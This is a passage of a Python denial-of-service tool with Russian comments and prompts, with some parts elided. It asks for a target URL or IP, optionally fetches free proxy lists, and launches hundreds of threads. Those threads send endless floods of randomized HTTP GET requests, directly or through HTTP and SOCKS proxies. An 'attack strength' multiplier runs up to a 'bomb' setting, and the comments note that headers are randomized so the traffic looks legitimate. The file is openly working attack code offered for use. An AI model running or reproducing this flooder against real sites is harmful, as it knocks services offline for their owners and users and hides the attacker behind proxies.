...
def starturl(): # в этой функции установлен URL-адрес, который можно использовать для будущей настройки HTTP.
	global url
	global url2
	global urlport
	global choice1
	...
	choice1 = input("\n [0]Цель?  \n или \n [1]вставить прокси (txt) > ")

	if choice1 == "1":
		ip_file = input("Вставить путь к txt файлу> ")
		ips = open(ip_file).readlines()



	else:
		url = input("\nВведите URL/IP: ").strip()
		...
		try:
			...
			print("опечатка, попробуйте еще раз.")
			starturl()
...
def proxymode():
	global choice2
	choice2 = input("Хотите использовать режим прокси/socks? введите 'y' для активации: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("Введите «0», чтобы включить прокси-режим, или введите «1», чтобы включить прокси режим (socksmode).: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("Вы сделали опечатку, попробуйте еще раз.")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("Хотите скачать новый список/прокси? введите «y» для «да»: ")
	if choice4 == "y":
...
def proxyget(urlproxy): # об этом говорится в названии, эта функция загружает проксы
	try:
		req = urllib.request.Request(("%s") % (urlproxy))       # здесь мы устанавливаем сайт, с которого можно скачать.
		req.add_header("User-Agent", random.choice(useragents)) # так как формат сайта идентичен
		sourcecode = urllib.request.urlopen(req)                # за free-proxy-list.net че за socks-proxy.net,
		part = str(sourcecode.read())                           # я устанавливаю переменную urlproxy на основе того, что вы выбираете.
		...
		out_file.close()
		print ("Прокси успешно загружены.")
	except: # если произойдет какой-то косяк
		print ("\nERROR!\n")
	proxylist() # если все идет гладко, то он продолжает выполнять функцию proxylist()

def proxylist():
	global proxies
	out_file = str(input("Введите имя файла/путь к прокси-листу (proxy.txt), нажмите enter если у вас уже лежит файл в папке с названием proxy.txt:"))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("Сколько потоков вы хотите? (по умолчанию 800):"))
	except ValueError:
		threads = 800
		print ("Выбрано 800 потоков (значение по умолчанию).\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("Сила атаки [(1-5=нормальная)(50=сильная)(100 или больше=бомба)]: "))
	except ValueError:
		print("Вы сделали опечатку, попробуйте еще раз.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("Нажмите «Enter», чтобы начать атаку: ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter":
		loop()
...
def loop():
	...
	] # заголовок принимается случайным образом, чтобы запросы выглядели более законными
	connection = "Connection: Keep-Alive\r\n"
	x = 0
	go = threading.Event()
	if choice2 == "y":# если мы выбрали режим проксирования
		if choice3 == "0": # и мы выбрали HTTP-прокси
			for x in range(threads):
				RequestProxyHTTP(x+1).start() # запустить соответствующий класс
				print ("\033[94m Thread \033[0m" + str(x) + " ready!")
			go.set() # это запускает потоки, как только они все готовы
		else: # если мы выбрали socks
			for x in range(threads):
				RequestSocksHTTP(x+1).start() # войти в соответствующий класс
				print ("\033[94m Thread \033[0m" + str(x) + " ready!")
			go.set() # это запускает потоки, как только они все готовы
	else: # в противном случае отправляйте обычные запросы без проксирования.
		for x in range(threads):
			RequestDefaultHTTP(x+1).start() # войти в соответствующий класс
			print ("\033[94m Thread \033[0m" + str(x) + " ready!")
		go.set() # это запускает потоки, как только они все готовы
...
class RequestProxyHTTP(threading.Thread): # класс многопоточности
	...
	def __init__(self, counter): # функция настроена практически только для счетчика потоков. Параметр счетчика функции передает x + 1 выше в качестве переменной счетчика.
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # функция, дающая инструкции различным потокам
		...
		current = x # за смену идентификатора всей ветки
		if current < len(proxies): # если идентификатор потока может быть связан с прокси, используйте этот прокси
			proxy = proxies[current].strip().split(':')
		else: # в противном случае он берет его наугад
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # подождите, пока потоки будут готовы
		while True: # бесконечная петля
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # вот наш socket
				s.connect((str(proxy[0]), int(proxy[1]))) # подключение к прокси
				s.send(str.encode(request)) # кодировать в байтах HTTP-запрос
				print ("\033[92m Пакеты отправляются из \033[0m" + str(proxy[0]+":"+proxy[1]) + "\033[91m Атака! \033[0m", self.counter) # запросы на печать
				try: # отправлять другие запросы в том же потоке
					for y in range(multiple): # коэффициент умножения
						s.send(str.encode(request)) # кодировать в байтах HTTP-запрос
				except: # если что-то пойдет не так, он закроет сокет, и цикл начнется заново.
					s.close()
			except:
				s.close() # если что-то пойдет не так, он закроет сокет, и цикл начнется заново.

class RequestSocksHTTP(threading.Thread): #класс многопоточности
	...
	def run(self): # функция, дающая инструкции различным потокам
		...
		accept = random.choice(acceptall) # выбор принимаем наугад
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		request = get_host + useragent + accept + connection + "\r\n" # окончательный состав запроса
		current = x # дать идентификатор потоку
		if current < len(proxies): # если идентификатор потока может быть связан с прокси, используйте этот прокси
			proxy = proxies[current].strip().split(':')
		else: # в противном случае он берет его наугад
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # дождаться готовности потоков
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # команда перейти в socks
				s = socks.socksocket() # создание сокета с помощью pysocks
				s.connect((str(url2), int(urlport))) # связь
				s.send (str.encode(request)) # отправка
				print ("\033[92m Пакет отправлен из \033[0m" + str(proxy[0]+":"+proxy[1]) + "\033[91m Атака! \033[0m", self.counter) # запрос на печать + счетчик
				try: # oтправлять другие запросы в том же потоке
					for y in range(multiple): # коэффициент умножения
						s.send(str.encode(request)) # кодировать в байтах HTTP-запрос
				except: # если что-то пойдет не так, он закроет сокет, и цикл начнется заново.
					s.close()
			except: # если что-то пойдет не так, за исключением закрытия сокета и подключения к попытке ниже
				s.close() # закрывает сокет
				try: # попытка пытается увидеть, вызвана ли ошибка неправильным типом socks, на самом деле она пытается с помощью SOCKS4
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # попробуй через SOCKS4
					s = socks.socksocket() # создание нового сокета
					s.connect((str(url2), int(urlport))) # связь
					s.send (str.encode(request)) # отправка
					print ("\033[92m Пакет отправлен из \003[0m" + str(proxy[0]+":"+proxy[1]) + "\033[91m Атака! \003[0m", self.counter) # запрос на печать + счетчик
					try: # отправлять другие запросы в том же потоке
						for y in range(multiple): # коэффициент умножения
							s.send(str.encode(request)) # кодировать в байтах HTTP-запрос
					except: # если что-то пойдет не так, он закроет сокет, и цикл начнется заново.
					...
					print ("\033[91m Socks не отвечает. Попытка отправить повторно \003[0m", self.counter)
					s.close() # если даже с этой попыткой можно было что-то отправить, то сок не работает и закрывает сокет.

class RequestDefaultHTTP(threading.Thread): # класс многопоточности
	...
	def run(self): # функция, дающая инструкции различным потокам
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # агент пользователя
		accept = random.choice(acceptall) # разрешение пользователя
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
		...
		while True:
			try:
				...
				s.connect((str(url2), int(urlport))) # связь
				s.send (str.encode(request)) # отправка
				print ("\033[93m Атака отправлена!!! \033[0m", self.counter) # запрос на печать + счетчик
				try: # отправлять другие запросы в том же потоке
					for y in range(multiple): # коэффициент умножения
						s.send(str.encode(request)) # кодировать в байтах HTTP-запрос
				except: # если что-то пойдет не так, он закроет сокет, и цикл начнется заново.
					s.close()
			except: # если что-то пойдет не так
				s.close() # закрыть сокет и начать заново
